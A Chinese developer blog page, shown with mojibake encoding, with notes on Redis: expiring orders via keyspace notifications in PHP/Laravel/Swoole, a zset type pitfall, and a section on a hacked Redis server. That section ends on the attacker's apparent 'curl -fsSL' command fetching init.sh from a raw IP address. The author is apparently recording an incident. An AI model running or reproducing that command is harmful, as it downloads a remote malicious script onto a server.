<p><a href="https://github.com/tsmliyun/laravel_quick_admin" target="_blank" rel="noopener">Laravel + H-ui æ­å»ºåå°ç®¡ç†ç³»ç»Ÿ</a></p>
<p><a href="https://pinapp.github.io/laravel-shou-ce" target="_blank" rel="noopener">laravelæ‰‹å†Œ</a></p>
<p><a href="https://laravelcode.cn/docs/5.8" target="_blank" rel="noopener">åŸºäº larecipe åšçš„ Laravel é€ŸæŸ¥è¡¨</a></p>
<p><a href="https://github.com/ratchetphp/Pawl" target="_blank" rel="noopener">Laravel ä¸­è¿æ¥ Webscoket</a></p>
<p><a href="https://github.com/aoxiang594/infyom-laravel-generator-simple-document" target="_blank" rel="noopener">è‡ªåŠ¨ç”Ÿæˆ CURD</a></p>
<p><a href="https://github.com/wmhello/laravel_template_with_vue" target="_blank" rel="noopener">laravel5.5å’Œvue.jsç»“åˆçš„å‰åç«¯åˆ†ç¦»é¡¹ç›®æ¨¡æ¿websocketèŠå¤©å®¤</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/redis-è®°å½•/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/redis-è®°å½•/" itemprop="url">redis è®°å½•</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-03-26T11:40:52+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  18.4k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  80 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="æŒ‡å®šæ—¶é—´è‡ªåŠ¨å–æ¶ˆè®¢å•"><a href="#æŒ‡å®šæ—¶é—´è‡ªåŠ¨å–æ¶ˆè®¢å•" class="headerlink" title="æŒ‡å®šæ—¶é—´è‡ªåŠ¨å–æ¶ˆè®¢å•"></a>æŒ‡å®šæ—¶é—´è‡ªåŠ¨å–æ¶ˆè®¢å•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) ä½¿ç”¨Linuxå†…ç½®çš„crontabå®šæ—¶ä»»åŠ¡ï¼Œæ¯éš”å‡ ç§’ç”šè‡³å‡ åˆ†é’Ÿè½®è®­éå†ä¸€æ¬¡æ•°æ®åº“ï¼Œæ‰¾åˆ°è¶…å‡ºæ—¶é—´é—´éš”çš„è®¢å•ï¼Œè¿›è¡Œå–æ¶ˆã€‚è¿™ç§åŠæ³•æ²¡æœ‰å¤±æ•ˆæ€§ä»¥åŠåœ¨æ²¡æœ‰è®¢å•çš„æ—¶é—´å†…å±äºæµªè´¹æœåŠ¡å™¨èµ„æºã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>) ä½¿ç”¨æ¡†æ¶å†…ç½®çš„å»¶æ—¶å¤„ç†æœºåˆ¶ã€‚æ¯”å¦‚Laravelçš„é˜Ÿåˆ—ä»»åŠ¡ï¼Œå¯ä»¥æŒ‡å®šå¤šå°‘åˆ†é’Ÿåæ‰§è¡Œã€‚è¿™æ ·å°±èƒ½åˆ¤æ–­è®¢å•æ˜¯å¦è¶…å‡ºæ—¶é—´é—´éš”ï¼Œæ˜¯å¦è¦å–æ¶ˆè®¢å•æ¢å¤åº“å­˜é‡ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>) ä½¿ç”¨Redisçš„keyspace notificationï¼ˆé”®ç©ºé—´é€šçŸ¥ï¼‰ã€‚Rediså¯ä»¥è®¾ç½®ä¸€ä¸ªkeyåˆ°å¤šä¹…æ—¶é—´åè¿‡æœŸ,æ¯”å¦‚:SETEX name <span class="number">123</span> <span class="number">20</span>,è®¾ç½®nameåœ¨<span class="number">20</span>ç§’åè¿‡æœŸã€‚æ­¤æ—¶ï¼Œè¿‡æœŸä¼šè§¦å‘äº‹ä»¶å‘å¸ƒï¼Œæ‰€æœ‰rediså®¢æˆ·ç«¯éƒ½ä¼šè®¢é˜…ï¼Œè·å¾—ç›¸å…³ä¿¡æ¯ã€‚</span><br><span class="line"><span class="comment">//https://www.guaosi.com/2019/02/25/automatically-cancel-the-order/</span></span><br><span class="line">vim usr/local/etc/redis/redis.conf</span><br><span class="line">notify-keyspace-events <span class="string">"Ex"</span></span><br><span class="line">service redis-server restart /usr/local/etc/redis/redis.conf</span><br><span class="line">ä¼šç›‘å¬<span class="number">0</span>å·åº“æ‰€æœ‰è¿‡æœŸçš„key</span><br><span class="line">redis-cli</span><br><span class="line">psubscribe __keyevent@<span class="number">0</span>__:expired ç›‘å¬<span class="number">0</span>å·åº“æ‰€æœ‰è¿‡æœŸçš„key</span><br><span class="line">setex name <span class="number">5</span> guaosi</span><br><span class="line"><span class="number">5</span>ç§’åï¼ŒåŸç»ˆç«¯ä¼šè¾“å‡ºå¦‚ä¸‹</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>) <span class="string">"pmessage"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"__keyevent@0__:expired"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"__keyevent@0__:expired"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"name"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MRedis</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    private $redis;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param string $host ä¸»æœºå·</span></span><br><span class="line"><span class="comment">     * @param int $port ç«¯å£å·</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$host = <span class="string">'redis'</span>, $port = <span class="number">6379</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis = <span class="keyword">new</span> redis();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;connect($host, $port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">expire</span>(<span class="params">$key = null, $time = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;redis-&gt;expire($key, $time);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">psubscribe</span>(<span class="params">$patterns = array(</span>), <span class="title">$callback</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;psubscribe($patterns, $callback);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">setOption</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å˜é‡$msgå°±æ˜¯è¿‡æœŸçš„keyçš„åç§°ï¼Œæˆ‘ä»¬åªèƒ½è·å–åˆ°keyçš„åç§°ï¼Œä¸èƒ½è·å¾—åˆ°åŸæ¥è®¾ç½®çš„å€¼ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">$redis, $pattern, $chan, $msg</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å›è°ƒå‡½æ•°,è¿™é‡Œå†™å¤„ç†é€»è¾‘</span></span><br><span class="line">    echo <span class="string">"Pattern: $pattern\n"</span>;</span><br><span class="line">    echo <span class="string">"Channel: $chan\n"</span>;</span><br><span class="line">    echo <span class="string">"Payload: $msg\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> MRedis();</span><br><span class="line"><span class="comment">//redisä¼šæœ‰é»˜è®¤è¿æ¥æ—¶é—´ï¼Œå¯¹ rediså®¢æˆ·ç«¯è¿›è¡Œä¸€äº›å‚æ•°è®¾ç½®ï¼Œä½¿è¯»å–è¶…æ—¶å‚æ•° ä¸º -1ï¼Œè¡¨ç¤ºä¸è¶…æ—¶ã€‚</span></span><br><span class="line">$redis-&gt;setOption();</span><br><span class="line"><span class="comment">//è¿™é‡Œè¾“å…¥è®¢é˜…ï¼Œä»¥åŠè®¢é˜…æˆåŠŸåè§¦å‘çš„å‡½æ•°å</span></span><br><span class="line"><span class="comment">//ç›‘å¬åº“ä¸º0é‡Œçš„è¿‡æœŸkey</span></span><br><span class="line">$redis-&gt;psubscribe(array(<span class="string">'__keyevent@0__:expired'</span>), <span class="string">'callback'</span>);</span><br><span class="line">php test.php</span><br><span class="line"></span><br><span class="line">larvel config/database.php</span><br><span class="line"><span class="string">'redis'</span> =&gt; [</span><br><span class="line">         <span class="string">'client'</span> =&gt; <span class="string">'predis'</span>,</span><br><span class="line">         <span class="string">'default'</span> =&gt; [</span><br><span class="line">             <span class="string">'host'</span> =&gt; env(<span class="string">'REDIS_HOST'</span>, <span class="string">'127.0.0.1'</span>),</span><br><span class="line">             <span class="string">'password'</span> =&gt; env(<span class="string">'REDIS_PASSWORD'</span>, <span class="literal">null</span>),</span><br><span class="line">             <span class="string">'port'</span> =&gt; env(<span class="string">'REDIS_PORT'</span>, <span class="number">6379</span>),</span><br><span class="line">             <span class="string">'database'</span> =&gt; env(<span class="string">'REDIS_DATABASE'</span>, <span class="number">0</span>),</span><br><span class="line">             <span class="string">'persistent'</span> =&gt; <span class="literal">true</span>, <span class="comment">// å¼€å¯æŒä¹…è¿æ¥</span></span><br><span class="line">             <span class="string">'read_write_timeout'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">             <span class="comment">//æ®Predisä½œè€…åœ¨é…ç½®æ–‡ä»¶ä¸­è¯´æ˜</span></span><br><span class="line">             <span class="comment">//å› ä¸ºåœ¨åº•å±‚ç½‘ç»œèµ„æºä¸Šæ‰§è¡Œè¯»å–æˆ–å†™å…¥æ“ä½œæ—¶ä½¿ç”¨äº†è¶…æ—¶ï¼Œé»˜è®¤è®¾ç½®äº†timeout ä¸º60sã€‚</span></span><br><span class="line">             <span class="comment">//åˆ°60sè‡ªåŠ¨æ–­å¼€å¹¶æŠ¥é”™.è®¾ç½®æˆ0å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</span></span><br><span class="line">         ],</span><br><span class="line"> </span><br><span class="line">     ],</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="comment">//åˆ›å»ºç”¨æˆ·è®¢å•</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">store</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¿™é‡Œæ˜¯æ¥æ”¶åˆ°ç”¨æˆ·ä¼ æ¥çš„ä¸‹å•ä¿¡æ¯ï¼Œå­˜å…¥æ•°æ®åº“åï¼Œè¿”å›ä¸€ä¸ªè®¢å•id</span></span><br><span class="line">        <span class="comment">//æˆ‘ä»¬è®©è¿”å›çš„è®¢å•IDä¸º2019</span></span><br><span class="line">        $order_id = <span class="number">2019</span>;</span><br><span class="line">        <span class="comment">//å› ä¸ºä¸€ä¸ªé¡¹ç›®ä¸­å¯èƒ½ä¼šæœ‰å¾ˆå¤šä½¿ç”¨åˆ°setexçš„åœ°æ–¹ï¼Œæ‰€ä»¥ç»™è®¢å•idåŠ ä¸ªå‰ç¼€</span></span><br><span class="line">        $order_prefix_id = <span class="string">'order_'</span>.$order_id;</span><br><span class="line">        <span class="comment">//å°†è®¢å•IDå­˜å…¥redisç¼“å­˜ä¸­ï¼Œå¹¶ä¸”è®¾ç½®è¿‡æœŸæ—¶é—´ä¸º5ç§’</span></span><br><span class="line">        $key_name = $order_prefix_id; <span class="comment">//æˆ‘ä»¬åœ¨è®¢é˜…ä¸­åªèƒ½æ¥æ”¶åˆ°$key_nameçš„å€¼</span></span><br><span class="line">        $expire_second = <span class="number">5</span>; <span class="comment">//è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå•ä½ä¸ºç§’</span></span><br><span class="line">        $value = $order_id;</span><br><span class="line">        Redis::setex($key_name,$expire_second,$value);</span><br><span class="line">        echo <span class="string">"è®¾ç½®è¿‡æœŸkey="</span>.$order_prefix_id.<span class="string">"æˆåŠŸ"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//é¡¹ç›®ä¸­æœ‰å¯èƒ½ç”¨çš„redisä¸æ˜¯0ï¼Œæ‰€ä»¥è¿™é‡Œç”¨envé…ç½®é‡Œé¢è·å–çš„</span></span><br><span class="line">        $publish_num=env(<span class="string">'REDIS_DATABASE'</span>, <span class="number">0</span>);</span><br><span class="line">        Redis::psubscribe([<span class="string">'__keyevent@'</span>.$publish_num.<span class="string">'__:expired'</span>], <span class="function"><span class="keyword">function</span> (<span class="params">$message, $channel</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//$message å°±æ˜¯æˆ‘ä»¬ä»è·å–åˆ°çš„è¿‡æœŸkeyçš„åç§°</span></span><br><span class="line">            $explode_arr=explode(<span class="string">'_'</span>,$message);</span><br><span class="line">            $prefix=$explode_arr[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>($prefix==<span class="string">'order'</span>)&#123;</span><br><span class="line">                $order_id=$explode_arr[<span class="number">1</span>];</span><br><span class="line">                echo $order_id;</span><br><span class="line">                <span class="comment">//è¿™é‡Œå°±æ˜¯ç¼–å†™è¿‡æœŸçš„è®¢å•ï¼Œè¿‡æœŸåè¦å¦‚ä½•å¤„ç†çš„ä¸šåŠ¡é€»è¾‘</span></span><br><span class="line">                <span class="comment">//TODO</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">   ç›‘å¬å¤„ç†ç¨‹åºåªè¦ä¸€å°å¤„ç†ï¼ŒæŠŠç›‘å¬å¤„ç†çš„è¿‡ç¨‹æ”¹ä¸€ä¸‹ï¼Œå–å‡ºè®¢å• ID ä¹‹åä¸è¦å»å¤„ç†ï¼Œé€šè¿‡ rpush æ”¾åˆ°ä¸€ä¸ª redis çš„é˜Ÿåˆ—é‡Œå»ã€‚å¦å¤–èµ·å‡ å°æœåŠ¡å™¨ï¼Œè¿åˆ°è¿™ä¸ª redis æœåŠ¡å™¨ï¼Œé€šè¿‡ blpop æ¥æ”¶æ¶ˆæ¯é˜Ÿåˆ—é‡Œå‡ºæ¥çš„è®¢å• IDã€‚è¿™æ ·ï¼Œå¤šå°æœºå™¨å¯ä»¥åŒæ—¶å·¥ä½œï¼Œä¸€ä¸ªè®¢å•åªä¼šä» blpop é‡Œå‡ºæ¥ä¸€æ¬¡ï¼Œä¸ä¼šé‡å¤æ‰§è¡Œï¼Œå¤šå°æœºå™¨å¯ä»¥åˆ†æ‹…ä»»åŠ¡ï¼Œåˆäº’ä¸å½±å“ã€‚æ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿå¯ä»¥æ¢æˆä¸šç•Œæˆç†Ÿçš„ rabbitmq ã€ kafka ä¹‹ç±»çš„ä¸“ä¸šæ¶ˆæ¯é˜Ÿåˆ—ï¼Œé‚£åˆæ˜¯å¦å¤–ä¸€ä¸ªè¯é¢˜äº†ã€‚åæ­£ä¸šåŠ¡é‡å¤§äº†ï¼Œå˜å¤æ‚äº†ï¼Œæ¶ˆæ¯æ€»çº¿è·‘ä¸æ‰ï¼Œå¤©çŒ«äº¬ä¸œä¹Ÿå·®ä¸å¤šå¦‚æ­¤https:<span class="comment">//learnku.com/articles/21488 </span></span><br><span class="line">    </span><br><span class="line">    ä½¿ç”¨ zset æ¯”åˆ©ç”¨ redis çš„å¤§ key set è¿™æ ·çš„å½¢å¼ï¼ŒèŠ‚çº¦ä¸€äº›ç©ºé—´å ç”¨ï¼Œå®šæ—¶ä»»åŠ¡å¤„ç†æ–¹é¢ï¼Œå¯ä»¥ä½¿ç”¨ swoole çš„ swoole_timer_tick å…¨éƒ½æ˜¯å†…å­˜çº§çš„æ“ä½œï¼Œä¼šæå‡å¾ˆå¤šæ•ˆç‡ã€‚https:<span class="comment">//alpha2016.github.io/2019/02/24/%E5%80%9F%E5%8A%A9Swoole%E5%AE%9A%E6%97%B6%E8%BF%87%E6%9C%9F%E6%9C%AA%E6%94%AF%E4%BB%98%E8%AE%A2%E5%8D%95/</span></span><br><span class="line">    å€ŸåŠ© redis çš„ zset æœ‰åºé›†åˆï¼Œè®¢å•äº§ç”Ÿçš„æ—¶å€™ï¼Œzadd orders timestamp orderid å°† orderid ä¿å­˜åˆ°å¯¹åº”çš„ orders é›†åˆä¸­ï¼Œä»¥æ—¶é—´æˆ³ä½œä¸ºä»–çš„ score åˆ†å€¼ï¼Œå­˜å‚¨éƒ¨åˆ†æ˜¯è¿™æ ·çš„ï¼Œç®€å• + å ç”¨ç©ºé—´å†…å­˜æå°ã€‚è¯»å–éƒ¨åˆ†ï¼š åœ¨ swoole å¯åŠ¨æ—¶ï¼Œè®¾ç½®å®šæ—¶å™¨ï¼Œæ¯åˆ†é’Ÿå» orders set ä¸­è¯»å–è®¾ç½®çš„æ—¶é—´ä¹‹å‰çš„æ•°æ®ï¼Œä¸ªäººä¸ºäº†æµ‹è¯•æ–¹ä¾¿ï¼Œè®¾ç½®çš„è¯»å–å‰ä¸€åˆ†é’Ÿåˆ°å‰ä¸‰ååˆ†é’Ÿå†…çš„æ•°æ®ã€‚è·å–åˆ°æ•°æ®ä¹‹åï¼Œæ ¹æ®ä¸šåŠ¡é€»è¾‘å¤„ç†æ•°æ®ï¼Œç„¶å zrem orders orderid å‘½ä»¤ä»é›†åˆä¸­ç§»é™¤å¯¹åº”çš„ orderidã€‚ä¸ªäººä»¥ä¸ºè¿™ä¸ªæ–¹æ¡ˆæ˜¯å†…å­˜å ç”¨å’Œæ•ˆç‡å…¼å…·çš„ä¸€ä¸ªæ–¹æ¡ˆ</span><br><span class="line">    </span><br><span class="line">    &lt;?php</span><br><span class="line">    $server = <span class="keyword">new</span> swoole_websocket_server(<span class="string">"0.0.0.0"</span>, <span class="number">9502</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åœ¨å®šæ—¶å™¨ä¸­ä½¿ç”¨åç¨‹éœ€è¦å¢åŠ æ­¤é¡¹é…ç½® </span></span><br><span class="line">    $server-&gt;set(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'enable_coroutine'</span> =&gt; <span class="literal">true</span></span><br><span class="line">        ]</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    $server-&gt;on(<span class="string">'workerStart'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $workerId</span>) </span>&#123;</span><br><span class="line">        $redis = <span class="keyword">new</span> Swoole\Coroutine\Redis();</span><br><span class="line">        $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// tick ä¸ºæŒç»­è§¦å‘çš„å®šæ—¶å™¨ </span></span><br><span class="line">        swoole_timer_tick(<span class="number">10000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span> (<span class="params">$redis</span>) </span>&#123;</span><br><span class="line">            $upperLimitTime = strtotime(<span class="string">'-1 minute'</span>);</span><br><span class="line">            $lowerLimitTime = strtotime(<span class="string">'-30 minute'</span>);</span><br><span class="line">            echo <span class="string">'ä¸Šé™æ—¶é—´:'</span> . $upperLimitTime . <span class="string">'ä¸‹é™æ—¶é—´:'</span> . $lowerLimitTime;</span><br><span class="line">            $result = $redis-&gt;zrangebyscore(<span class="string">'orders'</span>, $lowerLimitTime, $upperLimitTime);</span><br><span class="line">            var_dump($result);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// æ ¹æ®æŸ¥è¯¢åˆ°çš„ id è¿›è¡Œä¸šåŠ¡å¤„ç†ï¼Œç„¶å zrem orders orderid ç§»é™¤å¤„ç†æˆåŠŸçš„ orderid          </span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    $server-&gt;on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $request</span>) </span>&#123;</span><br><span class="line">        $server-&gt;push($request-&gt;fd, <span class="string">"hello"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    $server-&gt;start();</span><br></pre></td></tr></table></figure>
<h3 id="æ•°æ®ç±»å‹ä¸ä¸€è‡´"><a href="#æ•°æ®ç±»å‹ä¸ä¸€è‡´" class="headerlink" title="æ•°æ®ç±»å‹ä¸ä¸€è‡´"></a>æ•°æ®ç±»å‹ä¸ä¸€è‡´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸¤å¤„ä½¿ç”¨äº†ä¸€ä¸ª zSetsï¼Œä¸€å¤„æ˜¯ä»ç½‘é¡µè·å–æ•°æ®ï¼Œæ”¾åˆ° zSets é‡Œé¢ï¼›å¦ä¸€å¤„æ˜¯ä»æ•°æ®åº“è·å–æ•°æ®æ”¾åˆ° zSets é‡Œé¢ã€‚åœ¨åæœŸåšæ¸…é™¤æ•°æ®æ“ä½œçš„æ—¶å€™ï¼Œå‘ç°äº†æ•°æ®æ¸…é™¤çš„ä¸å®Œå…¨ï¼Œåæ¥ä»”ç»†çš„æ£€æŸ¥äº†ä¸€ä¸‹ã€‚å‘ç°æ•°æ®é‡å¤ã€‚</span><br><span class="line">https:<span class="comment">//www.h57.pw/2016/09/20/redis-zsets-data-type-inconsistency/</span></span><br><span class="line">ä»”ç»†æµ‹è¯•äº†å¥½ä¸€ä¼šå„¿ä¹‹åï¼Œæ‰å‘ç°äº†é—®é¢˜ååœ¨ï¼Œå°±æ˜¯å½“ score ç›¸åŒçš„æ—¶å€™ï¼Œç›¸åŒçš„ value ä¼šè¦†ç›–æ•°æ®ï¼Œè¿™é‡Œçš„ value ç›¸åŒï¼Œå¹¶ä¸ä»…ä»…æ˜¯å€¼ç›¸åŒï¼Œè€Œä¸”æ•°æ®ç±»å‹ä¹Ÿåº”è¯¥ä¸€è‡´æ‰ä¼šè¦†ç›–ã€‚å¦åˆ™å°±ä¼šäº§ç”Ÿ score ç›¸åŒçš„ä¸¤æ¡æ•°æ®ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="Redis-è¢«é»‘"><a href="#Redis-è¢«é»‘" class="headerlink" title="Redis è¢«é»‘"></a>Redis è¢«é»‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/28411</span></span><br><span class="line">MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because <span class="keyword">this</span> instance is configured to report errors during writes <span class="keyword">if</span> RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs <span class="keyword">for</span> details about the RDB error.</span><br><span class="line">ä¹‹åé€šè¿‡ <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; config set stop-writes-on-bgsave-error no å‘½ä»¤è§£å†³äº†é—®é¢˜</span><br><span class="line">æ‰§è¡Œ curl -fsSL http:<span class="comment">//198.13.42.229:8667/6HqJB0SPQqbFbHJD/init.sh 